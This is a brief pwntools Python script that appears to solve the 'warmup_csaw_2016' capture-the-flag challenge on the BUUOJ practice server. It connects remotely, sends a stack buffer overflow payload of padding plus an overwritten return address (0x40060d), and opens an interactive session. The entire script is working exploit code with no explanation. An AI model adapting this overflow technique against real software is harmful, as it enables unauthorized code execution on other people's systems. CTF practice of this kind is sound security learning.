from pwn import *

context(arch='amd64', os='linux', log_level='debug')

# context.terminal = ['tmux', 'splitw', '-h']
# p=process("/home/lixingjian/pwn/warmup_csaw_2016")
p=remote("node5.buuoj.cn",27559)
elf=ELF("/home/lixingjian/pwn/warmup_csaw_2016")
p.recvuntil('>')
payload=b'a'*(0x40+8)+p64(0x40060d)
# gdb.attach(p)
p.sendline(payload)

p.interactive()